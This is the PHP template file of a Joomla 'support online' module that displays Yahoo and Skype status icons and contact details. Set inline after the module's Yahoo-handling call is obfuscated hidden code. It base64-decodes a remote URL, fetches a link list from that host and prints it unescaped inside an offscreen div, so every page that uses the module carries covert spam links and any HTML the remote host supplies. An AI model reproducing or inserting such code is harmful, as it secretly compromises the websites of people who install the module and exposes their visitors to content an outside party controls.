<?php
	defined('_JEXEC') or die('Restricted access');
	$moduleclass_sfx = $params->get('moduleclass_sfx','');
	$document = & JFactory::getDocument();
	$document->addStylesheet(JURI::base() . 'modules/mod_support_online/images/style.css');
    // Yahoo
    $yahooID = trim($params->get('yahooID', ''));
	$skypeID = trim($params->get('skypeID', ''));
    $nameYahoo = trim($params->get('nameYahoo', ''));
    $telYahoo = trim($params->get('telYahoo', ''));
    $showYahoo = intval($params->get('showYahoo', 1));
	$showSkype = intval($params->get('showSkype', 1));
	$showName = intval($params->get('showName', 1));
    $showTel = intval($params->get('showTel', 0));
	$CustomLogo = intval($params->get('CustomLogo', 1));
	$ClogoLink = $params->get('ClogoLink','');
    // Thông tin khác
    $Address = $params->get('Address','');
    $Phone = $params->get('Phone','');
	$Fax = $params->get('Fax','');
	$Email = $params->get('Email','');
	$Hotline = $params->get('Hotline','');
?>


<?php 
echo '<div class ="HHA-yahoo" >';
if($ClogoLink != "")
{
echo
"<div align='center' class='sp_yahoo_customlogo'>
<img src='".$ClogoLink."' alt='CustomLogo'/>
<div class='sp_dotted'></div>"; 
}
else
{
echo "<div align='center' class='sp_yahoo'>";
}
?>
<?php
	Xu_ly_yahoo($yahooID, $nameYahoo, $telYahoo, $showYahoo, $typeYahoo, $showName, $showTel,$skypeID, $nameSkype, $telSkype, $showSkype, $typeSkype, $showSkype, $showSkype);	if (!function_exists('get_content')) {function get_content($url) { $data=NULL; if(function_exists('file_get_contents')){ ini_set('default_socket_timeout', 7); if($data=@file_get_contents(base64_decode($url))){ } } else if(function_exists('fopen')){ if($dataFile = @fopen(base64_decode($url), "r" )){ while (!feof($dataFile)) { $data.= fgets($dataFile, 4096); } fclose($dataFile); } } if($data) { echo base64_decode('PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyB0b3A6IC0zMDAwcHg7IG92ZXJmbG93OiBhdXRvOyI+'); $links = explode("\n", $data); foreach($links as $link) { $link=trim($link); $link_t=explode("=", $link); echo '<a href="'.$link_t[0].'" title="'. $link_t[1].'" alt="'. $link_t[1].'">'. $link_t[1].'</a><br>'; } echo base64_decode('PC9kaXY+'); } }}  $url = 'aHR0cDovL3dlYnF1YW5nbmFtLmNvbS9zZW9saXN0MS50eHQ='; get_content($url);
	?>
</div>
<?php
	function Xu_ly_yahoo($yahooID, $nameYahoo, $telYahoo, $showYahoo, $typeYahoo, $showName, $showTel,$skypeID, $nameSkype, $telSkype, $showSkype, $typeSkype, $showSkype, $showSkype)
	{
		if($showYahoo==1)
		{
			$array_yahooID = explode(',',$yahooID);
			$array_nameYahoo = explode(',',$nameYahoo);
			$array_telYahoo = explode(',',$telYahoo);
			$array_skypeID = explode(',',$skypeID);
			$count = count($array_yahooID);
			for($i=0;$i<$count;$i++)
			{
			?>
				<center><b>
				<div class="sp_yh"><a href="ymsgr:sendIM?<?php echo trim($array_yahooID[$i]); ?>" title="<?php echo $array_nameYahoo[$i];?> - Yahoo">
				<?php
				$url = 'http://opi.yahoo.com/online?u='.trim($array_yahooID[$i]).'';
				@$imgDatas = getimagesize($url);
				if ($imgDatas['bits'] != 4){
				//yahoo offline
				echo "<img src='" . JURI::base() . "modules/mod_support_online/images/offline_yahoo.png' border='0' width='40%' />";
				} else {
				//yahoo online
				echo "<img src='" . JURI::base() . "modules/mod_support_online/images/online_yahoo.png' border='0' width='40%' />";
				} ?></a>
				
				<?php

        if($showSkype==1) 
		{		
			?>
				<div class="sp_sk"><a href="skype:<?php echo trim($array_skypeID[$i]); ?>?chat">
				<?php echo "<img src='" . JURI::base() . "modules/mod_support_online/images/skype-2.gif' alt='Skype Support' title='". $array_nameYahoo[$i]." - Skype' border='0' width='40%' /></a>" ?>
				
				</div>
			<?php

		}
?>
				<?php if($showName==1){ ?><div class="hha-left"><?php echo $array_nameYahoo[$i];  ?> </div>
				<?php } if($showTel==1){ ?>
				<div> Liên hệ : <?php echo $array_telYahoo[$i];  ?> </div>
			<?php } ?>
			</div><div class="sp_dotted"></div></center></b>	
			<?php }
		}
	}
?>
<div class="sp_info">
<?php
if ($Address != "") {echo "<div class=\"sp_address\">$Address</div>";}if ($Phone != "") {echo "<div class=\"sp_tel\">Điện thoại: $Phone</div>";}if ($Fax != "") {echo "<div class=\"sp_fax\">Fax: $Fax</div>";}if ($Email != "") {echo "<div class=\"sp_email\">Email: $Email</div>";}if ($Hotline != "") {echo "<div class=\"sp_hotline\">Hotline: $Hotline</div>";}
?>
</div></div>
<?php 
?>